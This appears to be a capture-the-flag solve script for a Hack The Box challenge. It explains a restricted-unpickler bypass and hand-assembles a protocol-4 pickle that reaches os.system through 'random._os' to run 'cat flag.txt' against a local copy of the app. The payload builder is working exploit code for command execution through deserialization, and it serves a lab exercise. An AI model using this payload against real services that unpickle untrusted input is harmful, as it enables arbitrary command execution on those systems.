#!/usr/bin/env python3
"""Solve HTB `[Easy] We're Pickle Phreaks` -- a sandboxed-pickle escape.

Recon (source reconstructed from the official write-up in README.md -- the
challenge ships only the write-up, so you recreate `app.py` + `sandbox.py`):
the app lets you register a base64 pickle blob and later unpickles it with a
`RestrictedUnpickler` whose `find_class` only allows modules `__main__`/`app`
and blocks names starting with `__builtins__.`.

Clue: the whitelist is on the *module*, not on what that module can reach.
`app` imports `random`, and `random._os` IS the real `os` module. So the name
`random._os.system` resolved against module `app` passes the filter yet lands
on `os.system`. We hand-assemble a protocol-4 pickle whose STACK_GLOBAL picks
`app` / `random._os.system` and whose REDUCE calls it with `cat flag.txt`.

Everything runs as a LOCAL process; nothing remote is contacted.

Fetch first:  python challenges/fetch.py were-pickle-phreaks
(then reconstruct app.py and sandbox.py from README.md next to it.)
"""
import base64
import os
import re
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CHALL = os.path.join(REPO, "challenges", "were-pickle-phreaks")


def global_call_pickle(module: bytes, qualname: bytes, arg: bytes) -> bytes:
    """A proto-4 pickle: STACK_GLOBAL(module, qualname)(arg)."""
    return (
        b"\x80\x04"                                   # PROTO 4
        b"\x8c" + bytes([len(module)]) + module +      # SHORT_BINUNICODE module
        b"\x8c" + bytes([len(qualname)]) + qualname +  # SHORT_BINUNICODE qualname
        b"\x93"                                        # STACK_GLOBAL
        b"\x8c" + bytes([len(arg)]) + arg +            # SHORT_BINUNICODE arg
        b"\x85"                                        # TUPLE1
        b"R"                                           # REDUCE
        b"."                                           # STOP
    )


def main() -> None:
    app = os.path.join(CHALL, "app.py")
    if not os.path.exists(app):
        print("Reconstruct app.py + sandbox.py from README.md first "
              "(see the chapter).")
        return
    payload = global_call_pickle(b"app", b"random._os.system", b"cat flag.txt")
    blob = base64.b64encode(payload)
    # menu: 2 = register (send blob), 1 = view (triggers unpickle), 3 = exit
    stdin = b"2\n" + blob + b"\n1\n3\n"
    proc = subprocess.run(
        [sys.executable, "app.py"],
        input=stdin, capture_output=True, timeout=20, cwd=CHALL,
    )
    match = re.search(r"HTB\{[^}]*\}", proc.stdout.decode(errors="replace"))
    print("FLAG:", match.group(0) if match else "not found")


if __name__ == "__main__":
    main()
